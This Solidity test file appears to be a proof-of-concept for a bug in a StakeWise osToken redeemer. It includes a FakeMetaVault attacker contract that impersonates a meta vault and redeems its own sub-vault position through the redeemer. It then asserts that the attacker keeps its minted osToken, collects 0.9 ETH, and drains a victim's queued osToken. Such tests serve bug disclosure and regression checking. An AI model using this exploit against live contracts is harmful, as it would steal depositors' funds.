// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

import {EthVault} from "../contracts/vaults/ethereum/EthVault.sol";
import {EthOsTokenRedeemer} from "../contracts/tokens/EthOsTokenRedeemer.sol";
import {IOsTokenConfig} from "../contracts/interfaces/IOsTokenConfig.sol";

import {MetaVaultTestHelpers} from "./helpers/MetaVaultTestHelpers.sol";

contract RedeemSubVaultOsTokenBugTest is MetaVaultTestHelpers {
    address admin = makeAddr("admin");
    address victim = makeAddr("victim");

    EthVault subVault;
    EthOsTokenRedeemer redeemer;

    uint64 constant LTV_PERCENT = 9e17; // 90 %

    function setUp() public {
        _bootstrapStakeWise();

        // Real redeemer.
        redeemer = new EthOsTokenRedeemer(vaultsRegistry, address(osToken), osTokenController, admin, 0);

        // OsTokenConfig stubs: the sub-vault accepts redeemOsToken only from
        // `osTokenConfig.redeemer()`, which we point at the real redeemer.
        vm.mockCall(
            osTokenConfig,
            abi.encodeWithSelector(IOsTokenConfig.redeemer.selector),
            abi.encode(address(redeemer))
        );
        IOsTokenConfig.Config memory cfg = IOsTokenConfig.Config({
            liqBonusPercent: uint128(1e18),
            liqThresholdPercent: uint64(95e16),
            ltvPercent: LTV_PERCENT
        });
        vm.mockCall(osTokenConfig, abi.encodeWithSelector(IOsTokenConfig.getConfig.selector), abi.encode(cfg));

        // A real sub-vault to deposit into and mint osToken against.
        subVault = _createEthVault(admin, 1000 ether, 1000);
    }

    function test_redeemSubVaultOsToken_drainsExitQueueOsToken() public {
        // Seed the redeemer with an honest user's osToken via the exit queue.
        // This is the funds that the attack will destroy.
        uint256 victimOsToken = 9e18;
        deal(address(osToken), victim, victimOsToken);
        vm.startPrank(victim);
        osToken.approve(address(redeemer), victimOsToken);
        redeemer.enterExitQueue(victimOsToken, victim);
        vm.stopPrank();

        uint256 redeemerOsBefore = osToken.balanceOf(address(redeemer));
        assertEq(redeemerOsBefore, victimOsToken, "redeemer should hold the victim's queued osToken");
        assertEq(redeemer.queuedShares(), victimOsToken, "queuedShares accounting set");

        // Attacker: deploy a fake meta vault, deposit 1 ETH into the sub-vault,
        // mint max osToken to itself, then redeem its own position directly.
        FakeMetaVault attacker = new FakeMetaVault();

        vm.deal(address(this), 1 ether);
        uint256 attackerOsToken = attacker.depositAndMintMax{value: 1 ether}(subVault); // 0.9 osToken
        uint256 received = attacker.attack(redeemer, address(subVault), attackerOsToken);

        // The attacker keeps the osToken it minted AND walks away with the ETH.
        assertEq(received, 0.9 ether, "attacker received 0.9 ETH from the redeem");
        assertEq(address(attacker).balance, 0.9 ether, "ETH landed on the attacker");
        assertEq(
            osToken.balanceOf(address(attacker)), attackerOsToken, "attacker still holds its minted osToken"
        );
        assertEq(subVault.osTokenPositions(address(attacker)), 0, "attacker's sub-vault position closed");

        // The burn ate the victim's osToken: the redeemer's balance dropped
        // by the attacker's redeemed shares, while `queuedShares` is unchanged.
        // The exit queue is now under-backed by `attackerOsToken`.
        assertEq(
            osToken.balanceOf(address(redeemer)),
            redeemerOsBefore - attackerOsToken,
            "redeemer's osToken balance drained by the attack"
        );
        assertEq(redeemer.queuedShares(), victimOsToken, "queuedShares still claims the now-missing osToken");
    }
}

/// Minimal contract that impersonates a meta vault by exposing `subVaultsRegistry()`
contract FakeMetaVault {
    function subVaultsRegistry() external view returns (address) {
        return address(this);
    }

    receive() external payable {}

    /// Deposit `msg.value` into the sub-vault and mint the max osToken to self.
    function depositAndMintMax(EthVault subVault) external payable returns (uint256 osTokenShares) {
        subVault.depositAndMintOsToken{value: msg.value}(address(this), type(uint256).max, address(0));
        return subVault.osTokenPositions(address(this));
    }

    /// Redeem our own sub-vault position straight through the redeemer.
    function attack(EthOsTokenRedeemer redeemer, address subVault, uint256 osTokenShares) external returns (uint256) {
        return redeemer.redeemSubVaultOsToken(subVault, osTokenShares);
    }
}
